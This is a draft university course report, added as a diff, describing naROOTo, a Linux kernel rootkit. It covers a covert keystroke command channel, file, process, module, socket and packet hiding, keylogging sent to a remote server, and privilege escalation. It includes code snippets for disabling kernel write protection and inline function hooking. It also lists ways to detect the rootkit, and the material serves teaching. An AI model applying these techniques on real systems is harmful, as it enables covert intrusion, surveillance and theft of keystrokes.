@@ -1,0 +1,447 @@
+\documentclass[10pt, letterpaper]{scrartcl}
+\usepackage [english]{babel}
+\usepackage{enumitem}
+\usepackage{geometry}
+\usepackage{color}
+\usepackage{tikz}
+\usepackage{listings}
+\usepackage{latexsym}
+\usepackage{amsmath}
+\usepackage{multirow}
+\usetikzlibrary{snakes}
+\usetikzlibrary{patterns}
+\usepackage[loose]{subfigure}
+\usepackage[pdfborder={0 0 0}]{hyperref}
+
+
+\geometry{margin=2.5cm}
+
+\title{Our\_rootkit\_name - Rootkit Team 105}
+\subtitle{TUM \\Chair of IT Security\\  Rootkit Programming WS2014/15}
+\author{Nedko Stefanov Nedkov \and Matei Pavaluca}
+\date{\today}
+
+\begin{document}
+\maketitle
+\tableofcontents
+\newpage
+
+\section{TODO: Introduction}
+This rootkit has been implemented as part of the "Rootkit programming" praktikum
+course at the TUM in WS2015/16. 
+Chapter \ref{sec:compiling_and_installing} gives an overview of the system requirements and describes how to properly build, insert, and unload naROOTo.
+Chapter \ref{sec:implementation} discusses the implementations of the different functionalities while chapter \ref{sec:vulnerabilities} points to a few vulnerabilities of the rootkit.
+
+\section{Compiling and Installing}\label{sec:compiling_and_installing}
+Building and using naROOTo is fairly easy but a few things have to be observed.
+\subsection{System configuration}
+This rootkit has been implemented and tested on a specific system. It should
+well on other configurations, but this is the only tested configuration:
+\begin{itemize}
+    \item VirtualBox VM (5GB HDD, 1024MB memory) emulating a single x86-amd64 CPU
+    \item Debian Jessie 8.2 x86-64
+    \item Linux Kernel 4.1.10 x86-64 (Vanilla) built using the configuration of the Debian kernel as a base
+\end{itemize}
+
+\subsection{TODO: Building}
+Building requires the kernel sources and a valid System.map file. To build the LKM simply enter the source folder and issue the command \texttt{make}.
+This will compile the rootkit with all its functionality. To enable debugging to kernel messages edit the \texttt{Makefile} to include to compiler flag \texttt{-DDEBUG}.
+If the build was successful the file \texttt{naROOTo}.ko as well as other object files will be created in the source folder.
+
+\subsection{TODO: Loading}
+The rootkit can be inserted by issuing the command \texttt{insmod narooto.ko} as \texttt{root}.
+Afterwards it can be controlled by the covert communication channel described in the following chapter \ref{sec:command_and_control}.
+
+\section{TODO: Command and control}\label{sec:command_and_control}
+\subsection{Controlling \texttt{naROOTo}}
+After \texttt{naROOTo} is loaded, it can be controlled by a covert communication channel. 
+Commands are issued using the stdin of a shell.
+One just has to type them, no special permissions are required.
+Once a command is entered completely it will be executed immediately. Pressing \texttt{enter} is neither required nor suggested as the history of entered shell commands is logged on most systems.
+
+Each command starts with the same prefix: \texttt{f7R\_}.
+This is supposed to ensure that a regular user will not (de-)activate any rootkit functionality by accident and therefore reveal its use.
+After the prefix, the actual command is entered.
+Commands may or may not contain a single parameter.
+Multiple parameters are not supported at this time.
+They can be supplied by separating them from the command by a single space character.
+To finish the command and execute it (if it is valid), a semicolon is used.
+
+The basic syntax of any command therefore looks like this: \texttt{f7R\_command\textvisiblespace <optional\_parameter>;} 
+
+The following table \ref{tab:commands} lists all commands with a short description of their functionality.
+
+\begin{table}
+%\centering
+\begin{tabular}{ |l|l| }
+\hline
+\multicolumn{2}{ |c| }{File hiding} \\
+\hline
+ \texttt{f7R\_hide\_file\textvisiblespace<path>;} & Hides a single file or folder. \texttt{<path>} is the absolute path of the file to hide. \\
+ \texttt{f7R\_unhide\_file\textvisiblespace<path>;} & Unhides a previously hidden file or folder. \\
+  & \\
+ \texttt{f7R\_hide\_fprefix\textvisiblespace<prefix>;} & Hides all files and folders beginning with the prefix \texttt{<prefix>}. \\  & All files and subfolders of a hidden folder are also hidden. \\
+ \texttt{f7R\_unhide\_fprefix\textvisiblespace<prefix>;} & Removes the prefix \texttt{<prefix>} from the list of prefixes to hide. \\ \hline
+
+\multicolumn{2}{ |c| }{Process hiding} \\
+\hline
+\texttt{f7R\_hide\_process\textvisiblespace<pid>;} & Hides a specific process. \texttt{<pid>} is the id of the process to be hidden. \\
+\texttt{f7R\_unhide\_process\textvisiblespace<pid>;} & Unhides a previously hidden process. \\ \hline
+
+\multicolumn{2}{ |c| }{Module hiding} \\
+\hline
+\texttt{f7R\_hide\_module\textvisiblespace<name>;} & Hides any currently loaded LKM. \\ & \texttt{<name>} is the name of the module to be hidden. \\
+\texttt{f7R\_unhide\_module\textvisiblespace<name>;} & Unhides a previously hidden LKM. \\ \hline
+
+\multicolumn{2}{ |c| }{Hiding sockets} \\
+\hline
+\texttt{f7R\_hide\_tcp\textvisiblespace<port>;} & Hides a TCP socket from both the \texttt{ss} and the \texttt{netstat} command. \\ & \texttt{<port>} is the port number of the TCP socket to be hidden. \\
+\texttt{f7R\_unhide\_tcp\textvisiblespace<port>;} & Unhides a previously hidden TCP socket. \\
+& \\
+\texttt{f7R\_hide\_udp\textvisiblespace<port>;} & Hides a UDP socket from both the \texttt{ss} and the \texttt{netstat} command. \\ & \texttt{<port>} is the port number of the UDP socket to be hidden. \\
+\texttt{f7R\_unhide\_udp\textvisiblespace<port>;} & Unhides a previously hidden UDP socket. \\ \hline
+
+\multicolumn{2}{ |c| }{Hiding packets} \\
+\hline
+\texttt{f7R\_hide\_ip\textvisiblespace<ip>;} & Hides both TCP and UDP packets from packet sniffers such as \texttt{tcpdump}. \\ & \texttt{<ip>} is the ip address of the host whose packets are supposed to be hidden. \\
+\texttt{f7R\_unhide\_ip\textvisiblespace<port>;} & Unhides previously hidden packets. \\
+& \\
+\texttt{f7R\_hide\_service\textvisiblespace<port>;} & Hides all incoming TCP packets to a specified service. \\ & \texttt{<port>} is the port number of the service to be hidden. \\
+\texttt{f7R\_unhide\_service\textvisiblespace<port>;} & Unhides a previously hidden service. \\ \hline
+
+\multicolumn{2}{ |c| }{Port knocking} \\
+\hline
+\texttt{f7R\_enable\_knocking\_tcp\textvisiblespace<port>;} & Enables port knocking for a specified TCP service. \\ & \texttt{<port>} is the port number of the service to be hidden. \\
+\texttt{f7R\_disable\_knocking\_tcp\textvisiblespace<port>;} & Disable port knocking for a specified TCP service. \\ 
+ & \\
+\texttt{f7R\_enable\_knocking\_udp\textvisiblespace<port>;} & Enables port knocking for a specified UDP service. \\ & \texttt{<port>} is the port number of the service to be hidden. \\
+\texttt{f7R\_disable\_knocking\_udp\textvisiblespace<port>;} & Disable port knocking for a specified UDP service. \\ \hline
+
+\multicolumn{2}{ |c|}{Network keylogging} \\
+\hline
+\texttt{f7R\_enable\_net\_keylog\textvisiblespace<ip>;} & Enables network keylogging. \\ & \texttt{<ip>} specifies the IP address of the syslog-ng server. \\
+\texttt{f7R\_disable\_net\_keylog;} & Disables network keylogging. \\
+ & \\
+\texttt{f7R\_enable\_filelog;} & Enables local keylogging. \\
+\texttt{f7R\_disable\_filelog;} & Disables local keylogging. \\ \hline
+
+\multicolumn{2}{ |c| }{Privilege escalation} \\
+\hline
+\texttt{f7R\_escalate;} & Provides superuser access to a terminal. \\ 
+\texttt{f7R\_deescalate;} & Restores the previous permissions of a terminal.\\ \hline
+
+\end{tabular}
+\caption{Commands to control \texttt{naROOTo}}
+\label{tab:commands}
+\end{table}
+
+\section{TODO: Implementation}\label{sec:implementation}
+This chapter discusses the implementation details of \texttt{naROOTo}. 
+
+\subsection{High-level design}
+\texttt{naROOTo} was programmed using a modular approach. Each submodule represented by a header and a source file serves a very specific purpose.
+This makes it very easy to implement new functionality should the new arise in the future.
+
+\texttt{main.c} is the entry point for the LKM. In its \texttt{init\_module} function it enables the different functionalities by calling the appropriate functions. On unloading, \texttt{cleanup\_module} disables all of \texttt{naROOTo}'s features.
+The following table \ref{tab:files} describes the purpose of each component. \\
+
+
+
+\begin{tabular}{l*{6}r}
+File name             & Functionality \\
+\hline
+gensysmap.sh & Shell script that generates sysmap.h file.\\
+main.\{c,h\} & Module (un-)loading and basic configuration.\\
+control.\{c,h\} & Control API for the different functionalities.\\
+include.\{c,h\} & Helper functions.\\
+covert\_communication.\{c,h\} & Implementation of the covert communication channel.\\
+getdents.\{c,h\} & Hooking of the \texttt{getdents} syscall and related functionality.\\
+read.\{c,h\} & Hooking of the \texttt{read} syscall and related functionality.\\
+hide\_module.\{c,h\} & Functionality needed for hiding kernel modules.\\
+hide\_socket.\{c,h\} & Functionality needed for hiding TCP and UDP sockets.\\
+hide\_packet.\{c,h\} & Functionality needed for hiding packets. \\
+port\_knocking.\{c,h\} & A port knocking implementation.\\
+net\_keylog.\{c,h\} & Functionality needed for network keylogging.\\
+
+\end{tabular}
+
+\subsection{Obtaining address of kernel symbols}
+The kernel symbols are important in writing various modules.
+Many of them are not easily available through libraries or are not exported in recent kernel versions (e.g. the \texttt{sys\_call\_table}).
+The \texttt{System.map.<kernel version>} file in the \texttt{/boot} directory lists the addresses of all kernel symbols in the form:
+\begin{verbatim}
+address type symbol_name
+\end{verbatim}
+
+We wrote a simple shell script to convert this file into a format which can be used by a LKM.
+This script generates the \texttt{sysmap.h} file by parsing it using regular expressions. 
+The lines of the generated file then look like this:
+
+\begin{verbatim}
+#define sysmap_symbol_name address
+\end{verbatim}
+
+When a particular kernel symbol is required, its address can just be type-casted to the correct type or function signature. 
+
+A good example for this is the system call table which are further described in chapter \ref{sec:implementation_system_call_hooking}.
+We can access the system call table from in our module like this:
+
+\begin{verbatim}
+void **sys_call_table = (void *) sysmap_sys_call_table;
+\end{verbatim}
+
+\subsection{System call hooking}\label{sec:implementation_system_call_hooking}
+The system call table is an array of pointers to all available system calls of the Linux kernel and can be thought of as an API for accessing functionality that resides in kernel space.
+A basic technique of writing rootkits is manipulating specific system calls.
+
+There are several ways to do this, the easiest probably is manipulating the system call table itself to make specific system calls point to different functions of the same signature.
+When a user space process now calls that specific system call, it is actually directed to the (possibly malicious) function that was inserted.
+The original system call can be called by saving its pointer. This way a LKM can completely control what the user does (or doesn't) see.
+
+Another more sophisticated way of hooking system calls is manipulating the function directly.
+One can insert assembly instructions that cause a jump to a different location that contains a manipulated version of the system call.
+If one wants to call the original system call, however, the overwritten code needs to be restored first.
+
+Both ways are used in \texttt{naROOTo} and both require one additional feature to work: disabling the memory write protection. 
+Because such code is usually in regions that cannot be overwritten for security reasons, we have to disable it first.
+We do this by flipping a bit in the control register cr0 of the CPU.
+This tells it to ignore any write protections and go ahead with the instructions.
+Because this is written directly in assembly, those two functions are extremely portable and cannot be deprecated easily.
+This operation is possible because we are operating in kernel mode (CPU ring 0) and not user mode.
+The write protection of the CPU can be disabled and afterwards reenabled by using the following functions:
+
+\begin{verbatim}
+static void disable_page_protection(void) {
+
+    unsigned long value;
+    asm volatile("mov %%cr0,%0" : "=r" (value));
+    if (value & 0x00010000) {
+            value &= ~0x00010000;
+            asm volatile("mov %0,%%cr0": : "r" (value));
+    }
+}
+
+static void enable_page_protection(void) {
+
+    unsigned long value;
+    asm volatile("mov %%cr0,%0" : "=r" (value));
+    if (!(value & 0x00010000)) {
+            value |= 0x00010000;
+            asm volatile("mov %0,%%cr0": : "r" (value));
+    }
+}
+\end{verbatim}
+
+\subsection{File hiding}
+To hide files, \texttt{naROOTo} uses a manipulated \texttt{getdents} system call.
+
+\begin{verbatim}
+int getdents(unsigned int fd, struct linux\_dirent *dirp,
+                    unsigned int count);
+\end{verbatim}
+
+The manipulated function calls the original to get its output which is then scanned for files or folders that need to be hidden.
+Each file is represented by a \texttt{struct linux\_dirent} which contains additional information like its name.
+If it is decided that a file is supposed to be hidden, the memory of the following \texttt{linux\_dirent}s is moved forward (overwriting that entry) and the return value is adapted accordingly.
+This way the entry is no longer visible to the user space process that called \texttt{getdents}.
+
+To also hide symbolic links pointing to hidden files, the system call \texttt{readlink} is used.
+If the link points to a hidden file, the link is also hidden.
+This also works for nested links as the call is looped until either a true file is found or it is determined that the symbolic link is to be hidden.
+Because system calls are not intended to be called from kernel space, we had to disable the kernel checking for this.
+This was done by the following lines that tell the kernel to also execute system calls if the memory that was allocated for them belongs to the kernel:
+
+\begin{verbatim}
+/* tell the kernel to ignore kernel-space memory in syscalls */
+old_fs = get_fs();
+set_fs(KERNEL_DS);
+
+[...]
+	
+/* reset the kernel */
+set_fs(old_fs);
+\end{verbatim}
+
+\subsection{Process Hiding}
+To hide processes, \texttt{naROOTo} uses the already implemented file hiding.
+This is possible because tools like \texttt{ps} look at the \texttt{/proc}-filesystem which contains a subfolder for each process.
+All that is left to implement is to check if the current folder matches \texttt{/proc} (which can be done by looking at the file descriptor \texttt{fd}) and if the file name matches a PID of a hidden process. If both is the case, the file is hidden and tools like \texttt{ps} will no longer display it.
+
+\subsection{Module hiding}
+A user can display all currently loaded modules by issuing the command \texttt{lsmod} (which lists the entries from \texttt{/proc/modules}) and \texttt{/sys/modules}
+
+In the kernel, all modules are arranged as a linked list, where each item is of type \texttt{struct module}.
+Furthermore they are stored in a \texttt{struct kernfs\_node} which is an implementation of a red-blacktree.
+To hide a module from \texttt{lsmod} we need to delete its entry from the list of modules from both sources. 
+This can be easily achieved by using the list operations defined in \texttt{list.h} and the red-black tree operations defined in \texttt{rbtree.h}.
+Once removed from the list of modules and the kernfs tree, it will not be shown to user space anymore.
+This also means that one cannot remove it using \texttt{rmmod} while its hidden.
+
+To unhide a module, we just have to reinsert it in the data structures.
+
+\subsection{Keylogging}
+Implementing local keylogging is very straight forward.
+We just need to hook the \texttt{read} system call and write all characters entered into \texttt{stdin} to a file. 
+
+For remote keylogging we just send \texttt{UDP} packets containing the keystrokes using the \texttt{netpoll} kernel API to a remote location. 
+The only constraint is that netpoll can only send packets via an ethernet interface, not a wireless one. 
+
+First, we need to initialize the netpoll structure with remote and local IP addresses, ports and some further configuration. 
+The \texttt{netpoll} structure looks like this:
+
+\begin{verbatim}
+  struct netpoll {
+          struct net_device *dev;
+          char dev_name[IFNAMSIZ];		/* the network device used */
+          const char *name; 			
+          union inet_addr local_ip, remote_ip;	/* local and remote ip address
+								in network byte order */
+          bool ipv6; 
+          u16 local_port, remote_port; 		/* local and remote port */
+          u8 remote_mac[ETH_ALEN];		/* set to broadcast */
+  
+          struct work_struct cleanup_work;
+  };
+\end{verbatim}
+
+Any valid IPv4 address can be chosen for the local address. Once the structure is initialized, we call 
+
+\begin{verbatim}
+int netpoll_setup(struct netpoll *);
+\end{verbatim} 
+
+This function sets up everything needed for sending UDP packets. 
+Now the following function can be used to send the keystrokes combined with the process ID to the remove server.
+
+\begin{verbatim}
+netpoll_send_UDP(np, sned_buf, send_len); 
+\end{verbatim}
+
+\subsection{Command and control}
+The command and control interface also uses the hooked \texttt{read} system call.
+For each keystroke the function \texttt{accept\_input(char * input)} is called.
+To parse the commands, a state machine is being used.
+First, it is checked for the char sequence \texttt{f7R\_}.
+If this is detected, the state is changed to command enter mode.
+As soon as a space character is entered, the state switches to parameter enter mode.
+When a semicolon character is entered, the module tries to execute the command.
+
+To keep track of the different hidden ports, files, processes, etc. a number of linked list is maintained.
+When a new object is supposed to be hidden, it is simply added to the list.
+When it is supposed to be unhidden, it is removed.
+Before the LKM is unloaded, all lists are cleared and their memory is freed to prevent memory leaks.
+
+\subsection{Privilege Escalation}
+To grant superuser privileges to any shell, \texttt{naROOTo} manipulates the credentials of the particular process.
+This is done by setting all ids to 0 in the corresponding \texttt{struct cred}.
+The original values are stored to be able to return to regular privileges if necessary.
+
+The functions used for getting the credentials and writing them are:
+
+\begin{verbatim}
+struct cred * prepare_creds();
+commit_creds(struct cred *);
+\end{verbatim}
+
+\subsection{Socket hiding}
+To hide existing TCP/UDP sockets from the user we have to hide them from the \texttt{ss} and \texttt{netstat} commands.
+With a little bit of research we found out that netstat just uses the contents of \texttt{/proc/tcp} and \texttt{/proc/udp} for its output.
+
+Just hiding the files altogether was not an option as both commands would then completetly stop working.
+We therefore had to manipulate their contents. 
+To do this, we had to manipulate the \texttt{show} functions of the \texttt{/proc} entries of both files which are used to fill them. 
+We just iterate all entries until we find the matching ones.
+Hooking those is fairly easy as we just have to change the pointer to the show function in the proc datastructure. 
+
+The actual filtering is done by just checking if the socket uses a hidden port.
+If it is, we just \texttt{return 0} to indicate that there is no open socket.
+If not we return the output of the original show function.
+
+We then found out that \texttt{ss} also uses another system call for TCP sockets.
+To hide the sockets from \texttt{ss} we hook the \texttt{recvmsg} using the system call table. 
+Inside our manipulated \texttt{recvmsg} we check the outputted \texttt{nlmsghdr}s if they belong to a hidden port and hide them if necessary by overwriting their memory.
+
+\subsection{Packet hiding}
+Our goal was to hide network packets from any process which uses libcap to sniff packets.
+It uses packet sockets and then polls them every second to retrieve the information.   
+
+\begin{verbatim}
+socket(PF_PACKET, SOCK_RAW, 768) = 3
+poll([{fd=3, events=POLLIN}], 1, 1000) = 0 (Timeout)
+\end{verbatim} 
+
+Some further investigations of libcap lead us to understand that three functions are involved in getting the packet information: \texttt{packet\_rcv}, \texttt{tpacket\_rcv}, \texttt{packet\_rcv\_spkt}. These functions provide the packet information to user space.
+
+To hook the these functions we had to use different method as they are not in the system call table. 
+We copy assembly code at the top of the function body which leads to a jump to our manipulated function.
+Whenever we need to call the original function we, of course, have to restore this section with the original code.
+We used \texttt{push-ret} method to perform jump: first we \texttt{PUSH} the address of our function on the stack, then we jump to it using a \texttt{RET} instruction.
+This is accomplished by writing the following char array to the beginning of the original function.
+The address part is, of course, replaced with the actual address.
+
+\begin{verbatim}
+char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
+unsigned int *target = (unsigned int *) (hook + 1);
+\end{verbatim} 
+
+In the hooked functions, we check if we need to hide this packet.
+For this we extract the ip header from \texttt{sk\_buff} and check if we want to hide this ip address and return the values accordingly. 
+If we do not want to hide the packet in the hooked function, we just restore the original, call it, and finally hook it again. 
+  
+\subsection{Port knocking}
+To implement port knocking, we used the Netfilter API of the kernel.
+This is also used by programs like \texttt{iptables} and is well documented.
+This API works by providing hook points for custom functions that do the filtering.
+To set this up, we had to specify a few things:
+
+\begin{verbatim}
+        /* setup everything for the netfilter hook */
+        hook.hook = knocking_hook;              /* our function */
+        hook.hooknum = NF_INET_LOCAL_IN;        /* grab everything that comes in */
+        hook.pf = PF_INET;                      /* we only care about ipv4 */
+        hook.priority = NF_IP_PRI_FIRST;        /* respect my prioritah */
+
+        /* actually do the hook */
+        ret = nf_register_hook(&hook);
+\end{verbatim} 
+
+\texttt{knocking\_hook} is the name of our function that does the filtering. It is getting called whenever a packet is detected. \texttt{NF\_INET\_LOCAL\_IN} filters just packets that are destined for this machine (not packets that are forwarded). \texttt{PF\_INET} filters just IPv4 traffic. \texttt{NF\_IP\_PRI\_FIRST} means that the filter will be applied first (before all other filters).
+
+What we actually did is to require that a specific port sequence has to be triggered before a remote machine can connect to certain services.
+To implement this, we used the socket buffer of each packet to check it for its port.
+If it matches the list of ports that need to be triggered, a state machine will be updated.
+After all ports have been triggered within a specific time (set to two seconds), the remote machine can connect.
+The port triggering is further configured to only allow one remote machine access at a time.
+If a new machine successfully triggers the port, the old machine will lose access.
+
+If someone tries to connect to the filtered port without correctly triggering first, it will receive either an TCP RST or a ICMP Port Unreachable packet.
+The functionality for this is provided by another part of the Netfilter API: \texttt{net/netfilter/ipv4/nf\_reject.h}.
+
+\section{TODO: Vulnerabilities}\label{sec:vulnerabilities}
+Even though \texttt{naROOTo} utilizes multiple techniques to hide itself, there are still a few weaknesses that allow its detection.
+
+\subsection{Detection via hooked system calls}
+Because \texttt{naROOTo} manipulates some pointers in the system call table, it is easy to detect this way.
+One could scan the system call table and compare it to a clean one if available (or the addresses of the specific functions in the System.map file).
+A mismatching pointer indicates a hooked system call and threrefore an infection with a rootkit.
+
+\subsection{Detection via hidden processes}
+Because \texttt{naROOTo} just hides the processes from the file system, there are a number of ways to detect this.
+It is still possible to send signals to hidden process, so a \texttt{kill -0 <PID>} will return no error message on a hidden process while it would return one on a not existing one.
+One could furthermore scan the kernel structure containing all processes (\texttt{struct task\_struct}) for processes and compare it to the displayed ones.
+
+\texttt{Detection via hidden files}
+Because our rootkit is running in a VM one can mount the disk image of a not running VM and compare its file system to the one displayed by the kernel. 
+Any mismatches indicate hidden files.
+
+
+\section{TODO: Conclusion}
+As seen in this paper, \texttt{naROOTo} is a decent LKM rootkit for educational purposes.
+It demonstrates the basic techniques of hiding different things from user space but can still be quite easily detected by a skilled administrator.
+There are, however, further improvements that can be done to increase the stealthyness.
+One could use a different method of hiding processes (like manipulating the kernel datastructures directly) to make it harder to detect those.
+A different system call hooking method (like the use of a trampoline) can also improve the rootkit, as one would have to scan the system call code itself instead of just the pointers of the system call table in order to detect it.
+
+There will always be, however, a few ways to detect LKM rootkits. As soon as the system is not running, the rootkit can no longer conceil itself and can easily be detected by closely examining the harddrive.
+
+\end{document}
